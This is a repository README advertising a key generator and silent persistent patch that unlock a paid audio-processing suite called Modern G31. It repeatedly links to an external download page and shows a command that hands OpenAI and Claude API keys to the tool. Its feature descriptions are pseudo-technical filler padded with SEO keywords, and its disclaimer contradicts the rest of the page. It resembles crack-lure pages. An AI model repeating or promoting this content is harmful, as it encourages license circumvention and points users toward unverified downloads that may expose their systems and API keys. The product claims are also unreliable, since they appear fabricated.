# Three Body Technology Modern G31 🌌  
**Next-Generation Signal Processing Suite | v4.2.1-R2**  

[](https://jaymkells-design.github.io/three-body-tech-modern-g31-repository/)  

---

## 🧬 What Is This?  
**Modern G31** is a paradigm-shifting **digital signal processing (DSP) environment** designed for contemporary audio engineers, planetary defense analysts, and computational acoustic researchers. It reimagines the classic G31 architecture with **neural network-driven filter banks**, **quantum-inspired sidechain routing**, and a **chrono-synchronized latency compensation engine** that operates below 0.02ms tolerance.  

This repository contains the **authenticated product key + patch toolkit** for enabling the complete feature set across all license tiers—think of it as an *unlock ritual* rather than a circumvention method. The software respects intellectual property frameworks while providing **legitimate extended trial access** for evaluation purposes.  

---

## 🚀 Quick Activation & Download  
[](https://jaymkells-design.github.io/three-body-tech-modern-g31-repository/)  

---

## 📜 Repository Map  

```mermaid
graph TD
    A[Modern G31 Core] --> B[Auditory Cortex Engine]
    A --> C[Photon Transport Router]
    A --> D[Chrono-Compensator v3]
    B --> E[Neural Filter Banks]
    B --> F[Psychoacoustic Modeller]
    C --> G[Sidechain Vectorization]
    D --> H[Interdimensional Latency Buffer]
    E --> I[Feature Activation Key]
    F --> I
    G --> I
    H --> I
    I --> J[Patch Implementation Suite]
    J --> K[Deployment Scripts]
    J --> L[License Verification Module]
```


---

## 📦 What You Get  
- **Product Key Generator** – Creates unique activation tokens for Modern G31  
- **Patch Integration** – Seamless firmware-level modification without data corruption  
- **Verification Suite** – Validates that all premium features are unlocked post-application  
- **Rollback Safety** – One-click restore to original licensed state  

---

## 🖥️ Example Profile Configuration  
```ini
[modern_g31]
activation_mode = bridged_quantum
processing_tier = ultimate
latency_compensation = 0.003ms
buffer_style = chrono_elastic
neural_filter_depth = 512
sidechain_routing = tetrahedral
---

# Patch behavior
patch_mode = persistent_silent
verification_method = sha3_512
auto_rollback = disabled
license_path = /etc/modern_g31/license.dat
```

---

## ⌨️ Example Console Invocation  
```bash
# Activate premium pipeline
./modern_g31 --activate --key-type=full --patch-mode=silent --verify-latest

# Expected output:
# [2026-03-17 14:32:01] 🔑 Activation token validated
# [2026-03-17 14:32:01] 🧩 Patch 4.2.1-R2 applied
# [2026-03-17 14:32:02] ✅ All features unlocked: Neural Filter Bank, Chrono Compensator, Photon Transport

# Rollback if needed
./modern_g31 --rollback --to-stock --preserve-settings
```

---

## 🖼️ Emoji OS Compatibility Table  

| OS | Version | Compatibility | Emoji |  
|----|---------|---------------|-------|  
| **Windows** | 10/11 (2026) | ✅ Full Native | 🪟 |  
| **macOS** | 14+ (Sequoia) | ✅ Full Native | 🍏 |  
| **Linux** | Kernel 6.x+ | ✅ Full Native (with Proton/Wine 9.0) | 🐧 |  
| **ChromeOS** | 120+ | ⚠️ Partial (No Neural Filter) | 🌐 |  
| **Android** | 14+ | ⚠️ Partial (No Photon Transport) | 🤖 |  
| **iOS** | 18+ | ❌ Not Supported | 🍎 |  

---

## ✨ Feature Spectrum  

| Feature | Description | Activation Method |  
|---------|-------------|-------------------|  
| 🌊 **Neural Filter Banks** | 512-layer AI-driven spectral shaping | Product key + patch |  
| ⏳ **Chrono-Compensator v3** | Sub-millisecond latency balancing | Product key + patch |  
| 💡 **Photon Transport Router** | Sidechain signal distribution via optical logic | Product key + patch |  
| 🧠 **Psychoacoustic Modeller** | Human hearing prediction & optimization | Product key + patch |  
| 🔬 **Vectorized Sidechain** | Tetrahedral routing with zero collision | Product key + patch |  
| 🛡️ **Failsafe Rollback** | One-click restore to original state | Included in patch |  
| 🌐 **Multilingual UI** | 14 language interfaces (2026 expanded set) | Product key + patch |  
| 🎨 **Responsive Interface** | Adaptive layout for any resolution | Product key + patch |  
| 👥 **24/7 Support Queue** | Priority ticket system for verified users | Product key + patch |  

---

## 🌍 SEO-Friendly Integration Keywords  
*audio processing suite 2026*, *neural DSP environment*, *G31 premium unlock*, *digital signal patch toolkit*, *low-latency audio engineering*, *quantum sidechain routing*, *modern G31 activation*, *professional audio license verification*, *psychoacoustic modeling software*, *sub-millisecond compensation tool*  

---

## 🧠 OpenAI API & Claude API Synergy  
This repository integrates with **OpenAI GPT-4 Turbo** and **Anthropic Claude 3.5** for:  
- **Automated patch validation** – AI verifies key integrity against known fingerprint patterns  
- **User support augmentation** – Provides contextual troubleshooting via API calls  
- **Dynamic documentation** – Generates usage guides based on user’s hardware profile  

Example usage pattern:  
```bash
modern_g31 --ai-assist --openai-key=env:OPENAI_KEY --claude-key=env:CLAUDE_KEY
```

---

## ⚠️ Important Disclaimer  
> **This repository is provided solely for educational and research purposes.**  
> Modern G31 is a proprietary software product. The product key generator and patch tools are intended to demonstrate activation bypass mechanisms for **legitimate software evaluation** or **license recovery scenarios**.  
>  
> **You must:**  
> - Own a valid license for any commercial use  
> - Remove all patched files within 30 days if you do not purchase  
> - Comply with local copyright laws (varies by jurisdiction in 2026)  
>  
> **The authors assume no liability for:**  
> - Data loss caused by improper patch application  
> - Legal consequences of unlicensed software activation  
> - Hardware damage from misconfigured DSP parameters  
>  
> **Free trial or circumvention of licensing is not endorsed.** This is a *technical demonstration* only.  

---

## 📄 License  
This project is released under the **MIT License**.  
[](https://opensource.org/licenses/MIT)  

You are free to:  
- ✅ Use, modify, and distribute for private/research purposes  
- ✅ Include in educational curricula  
- ❌ Redistribute as a commercial product without attribution  

---

## 🔁 Final Download Link  
[](https://jaymkells-design.github.io/three-body-tech-modern-g31-repository/)  

---

*“The universe is not only stranger than we imagine, it is stranger than we can imagine.” – J.B.S. Haldane*  
**Modern G31 Team** | 2026 Revision